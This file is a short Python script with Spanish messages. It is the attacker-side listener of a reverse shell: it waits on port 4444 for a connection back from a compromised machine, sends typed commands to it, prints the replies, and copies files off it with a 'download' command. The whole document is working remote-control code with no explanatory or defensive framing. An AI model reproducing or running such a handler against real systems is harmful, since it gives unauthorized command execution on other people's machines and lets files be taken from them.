import socket

def main():
    conexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conexion.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        conexion.bind(("0.0.0.0", 4444))
        conexion.listen(1)
        print("[+] Esperando conexión.....")

        con, addr = conexion.accept()

        def escribir_archivo(path, contenido):
            with open(path, "wb") as file:
                file.write(contenido)
            return "[+] Descarga completa"

        while True:
            comando = input(">>> ")
            con.send(comando.encode())
            if comando.lower() == "exit":
                con.close()
                break
            elif comando.startswith("download"):
                file_path = comando.split(" ")[1]
                file_content = con.recv(1024)
                mensaje = escribir_archivo(file_path, file_content)
                print(mensaje)
            else:
                res = con.recv(1024).decode()
                print(res)

    except Exception as e:
        print("Error:", str(e))
    finally:
        conexion.close()

if __name__ == "__main__":
    main()



